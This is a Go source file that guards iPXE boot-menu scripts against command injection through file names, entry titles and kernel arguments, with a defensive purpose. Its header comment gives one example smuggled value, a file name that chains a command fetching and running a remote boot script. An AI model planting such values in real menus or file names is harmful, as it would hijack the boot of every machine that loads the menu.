// Package ipxesafe keeps text that did not come from Bootlace itself (the name of an ISO file, an entry title read from an ISO's own boot menu, the arguments of a menu entry) from
// becoming iPXE commands. A menu is an iPXE script: every line is a command, and iPXE ends a command at a word that is exactly `&&`, `||` or `;` and runs what follows as the next
// command, so a file called "x && chain http://elsewhere/boot.ipxe ; y.iso" would run that command on every PC that shows the menu. Line breaks are the other way in, and
// `${name}` is replaced by the value of the iPXE setting of that name.
// Copyright (c) 2026 Gola Services SUARL. Licensed under GPL-3.0-or-later; see LICENSE and ADDITIONAL-TERMS.md.
package ipxesafe

import "strings"

// Terminator says whether a word (a run of characters between spaces) ends an iPXE command and starts a chained one.
func Terminator(word string) bool { return word == "&&" || word == "||" || word == ";" }

// space is what iPXE's isspace takes for a separator of words: more than the space and the line break (a vertical tab or a form feed also splits a command into words).
func space(r rune) bool { return r == ' ' || (r >= 0x09 && r <= 0x0d) }

// Text is s as one line of plain words: every control character becomes a space, `${` is broken so that nothing is expanded, and a word that would chain commands is turned into
// the character it is made of (`&&` becomes `&`, `||` becomes `|`, `;` becomes `,`). The words are otherwise kept as they are.
func Text(s string) string {
	s = strings.Map(func(r rune) rune {
		if r < 0x20 || r == 0x7f {
			return ' '
		}
		return r
	}, s)
	// (the ends are trimmed first, with Unicode's idea of a space: a caller that trims afterwards must not be able to uncover a lone `;` that had a no-break space beside it)
	s = strings.ReplaceAll(strings.TrimSpace(s), "${", "$ {")
	words := strings.Split(s, " ")
	for i, w := range words {
		switch w {
		case "&&":
			words[i] = "&"
		case "||":
			words[i] = "|"
		case ";":
			words[i] = ","
		}
	}
	return strings.Join(words, " ")
}

// Args is a line of arguments for a kernel: Text, with the words that were chained commands taken out altogether (a kernel does not want a lone `;` either) and the spaces made
// single.
func Args(s string) string {
	var out []string
	for _, w := range strings.Fields(strings.Map(func(r rune) rune {
		if r < 0x20 || r == 0x7f {
			return ' '
		}
		return r
	}, s)) {
		if !Terminator(w) {
			out = append(out, strings.ReplaceAll(w, "${", "$ {"))
		}
	}
	return strings.Join(out, " ")
}

// UnsafeArgs says what is wrong with a line of arguments that a person typed, or "" when it is fine: a lone `&&`, `||` or `;` would start another iPXE command, and a control
// character other than a space would split the command line.
func UnsafeArgs(s string) string {
	for _, r := range s {
		if (r < 0x20 && !space(r)) || r == 0x7f {
			return "a control character is not allowed in kernel arguments"
		}
		if space(r) && r != ' ' {
			return "only spaces may separate kernel arguments (no tab, line break or other control character)"
		}
	}
	for _, w := range strings.Split(s, " ") {
		if Terminator(w) {
			return `the words "&&", "||" and ";" are not allowed as separate words in kernel arguments (iPXE would take them as the start of another command)`
		}
	}
	return ""
}
